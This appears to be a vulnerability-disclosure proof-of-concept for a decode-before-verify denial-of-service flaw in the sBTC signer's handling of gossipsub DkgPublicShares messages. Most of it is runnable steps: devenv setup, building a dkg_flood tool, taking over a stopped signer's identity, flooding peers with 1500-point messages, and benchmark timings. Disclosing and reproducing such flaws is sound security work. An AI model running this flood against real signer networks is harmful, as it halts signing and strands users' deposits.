# PoC — Report #83769: `DkgPublicShares` decode-before-verify DoS

A single malicious signer floods gossipsub `DkgPublicShares` messages
packed with 1500 points. Every point runs `Point::lift_x` on the
victim's libp2p event-loop thread *before* the outer ECDSA signature is
checked (see [event_loop.rs:428](signer/src/network/libp2p/event_loop.rs#L428)),
pinning the thread and halting signing.

## Run the attack

```sh
# 1. Devenv up, wait for two signers to reach nakamoto.
make emily-cdk-synth   # first run only
make devenv-up
docker logs -f sbtc-signer-2 2>&1 | grep -m1 "up to date with the current aggregate key"

# 2. Build.
cargo build --example dkg_flood --features testing -p signer
cargo build --bin demo-cli

# 3. Baseline sweep (with 3 honest signers).
export BITCOIN_RPC_URL=http://devnet:devnet@127.0.0.1:18443/wallet/depositor
./target/debug/demo-cli donation --amount 10000
./target/debug/demo-cli deposit  --amount 10000000   # should confirm on Emily

# 4. Free signer-1's libp2p identity for the flooder to use.
docker stop sbtc-signer-1
./target/debug/demo-cli deposit --amount 8000000     # 2-of-3 still sweeps

# 5. Flood.
./target/debug/examples/dkg_flood \
  41634762d89dfa09133a4a8e9c1378d0161d29cd0a9433b51f1e3d32947a73dc \
  9bfecf16c9c12792589dd2b843f850d5b89b81a04f8ab91c083bdf6709fbefee01=/ip4/127.0.0.1/tcp/4123 \
  3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401=/ip4/127.0.0.1/tcp/4124

# 6. In a second shell, submit a deposit. It stays pending until you Ctrl-C the flooder.
./target/debug/demo-cli deposit --amount 6000000
```

Flooder logs on a healthy attack: `peers=2 published=<growing> errored=0`.

Two devenv tweaks are on this branch that make step 4 safe: signer p2p
ports are published to `127.0.0.1:4122-4124`, and `sbtc-signer-1`'s
event-observer entry is removed from `docker/stacks/stacks-regtest-miner.toml`
so the miner does not stall when signer-1 is stopped.

## Cleanup

```sh
docker start sbtc-signer-1   # or: make devenv-down
```

## Measure the decode cost

`bench_deserialize_dkg_public_shares` in
[signer/src/proto/convert.rs](signer/src/proto/convert.rs) times a
single oversized decode in a tight loop. `#[ignore]`d so it stays out of
normal test runs.

```sh
cargo test --lib -p signer --release \
  proto::convert::tests::bench_deserialize_dkg_public_shares \
  -- --ignored --nocapture
```

Sample output (Apple silicon, release):

```
encoded SignerDkgPublicShares: 63132 bytes (1500 points)
decoded 100 messages × 1500 points in 1.568821625s
  15.69 ms / message
  10.46 µs / point (Point::lift_x)
  63.7 messages / second sustained
```

Knobs (`points_per_commitment`, `iterations`) are near
[signer/src/proto/convert.rs:1846](signer/src/proto/convert.rs#L1846).
